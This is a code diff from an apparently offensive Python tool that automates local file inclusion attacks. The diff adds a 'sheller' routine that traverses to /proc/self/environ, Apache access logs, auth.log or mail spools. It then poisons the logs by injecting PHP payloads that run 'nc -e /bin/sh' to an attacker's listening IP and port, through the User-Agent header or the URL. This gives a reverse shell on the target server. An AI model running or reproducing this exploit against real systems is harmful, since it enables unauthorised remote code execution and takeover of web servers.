@@ -423,15 +423,23 @@ def phase2(attack, url, url2, keyword, cookie, selected, files, dirs, depth, ver
                 d+=1
     return (found, urls)
 
-def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
+def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
     #resolve issues with inpath attack
     if not url.endswith("/"):
         url += "/"
 
     s = session()
 
-    depth = 50
-    file = "/proc/self/environ"
+    depth = 10
+    if technique == 1:
+        file = "/proc/self/environ"
+    elif technique == 2:
+        file = "/var/log/apache2/access.log"
+    elif technique == 3:
+        file = "/var/log/auth.log"
+    elif technique == 4:
+        file = "/var/mail/www-data"
+    
     success = None
 
     if authcookie != "":
@@ -499,7 +507,7 @@ def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nul
                     except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                         print("Timeout reached for " + url)
                         continue
-                requestlist.append((r, p, "", data, prep))
+                requestlist.append((r, p, "", data, traverse))
             else:
                 for nb in nullist:
                     data = {}
@@ -551,15 +559,21 @@ def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nul
                         success = (r, p, nb, data, traverse)
                         found = True
                         break
+                if verbose:
+                    if attack == 1 or attack == 2:
+                        print(color.END + "{}|: ".format(r.status_code)+r.url)
+                    elif attack == 3 or attack == 4:
+                        print(color.END + "{}|: ".format(r.status_code)+r.url + " : " + p)
             d+=1
             if found:
                 break
+
     
     if success:
         if attack == 1:
-            prep = query(success[4], "", file, success[2], keyword, url, url2, s)
+            prep = query(success[4], "", file, success[2], keyword, url, url2, s)[0]
         elif attack == 2:
-            prep = inpath(success[4], "", file, success[2], url, url2, s)
+            prep = inpath(success[4], "", file, success[2], url, url2, s)[0]
         elif attack == 3:
             s.cookies.set(selected, success[1])
             req = requests.Request(method='GET', url=url)
@@ -567,5 +581,31 @@ def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nul
         elif attack == 4:
             req = requests.Request(method='POST', url=url, data=success[3])
             prep = s.prepare_request(req)
-        prep.headers['User-agent'] = '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
-        s.send(prep)
+
+        if technique == 1:
+            prep.headers['User-agent'] = '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep)
+            prep.headers['User-agent'] = '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep)
+            prep.headers['User-agent'] = '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep)
+        elif technique == 2:
+            req = requests.Request(method='GET', url=url)
+            prep2 = s.prepare_request(req)
+            prep2.url = url + "/" + '<?php system("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep2)
+            prep2.url = url + "/" + '<?php exec("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep2)
+            prep2.url = url + "/" + '<?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)
+            s.send(prep2)
+            s.send(prep)
+        elif technique == 3:
+            pass
+        elif technique == 4:
+            pass
+
+        
+def lfishell(attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata):
+    for technique in range(1, 5):
+        sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata)
+    #sheller(1, attack, url, url2, keyword, cookie, selected, verbose, paylist, nullist, authcookie, postdata)
